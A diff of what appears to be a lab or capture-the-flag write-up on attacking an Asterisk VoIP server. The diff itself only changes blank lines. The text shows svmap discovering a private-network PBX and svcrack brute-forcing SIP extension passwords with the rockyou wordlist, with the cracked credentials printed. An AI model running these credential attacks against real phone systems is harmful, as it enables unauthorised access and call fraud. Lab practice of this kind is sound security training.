@@ -42,7 +42,6 @@ psycor@leetspeek:~$ svmap 192.168.43.0/24
 | SIP Device          | User Agent                        | Fingerprint |
 -------------------------------------------------------------------------
 | 192.168.43.173:5060 | Asterisk PBX 1.6.0.26-FONCORE-r78 | disabled    |
-
 ```
 
 The svmap shows that the ip address 192.168.43.173 is a VoIP server so let’s try to gather more information and enumerate some valid extensions.
@@ -80,13 +79,13 @@ ERROR:ASipOfRedWine:We got an unknown response
 | 101       | iloveyou |
 ```
 
+
 ```console
 psycor@leetspeek:~$ svcrack -u102 -d /usr/share/wordlists/rockyou.txt 192.168.43.173
 ERROR:ASipOfRedWine:We got an unknown response
 | Extension | Password |
 ------------------------
 | 102       | 123456   |
-
 ```
 Ok, Cool! we found two passwords but one cracked extension is enough to proceed for the next part ;)
 
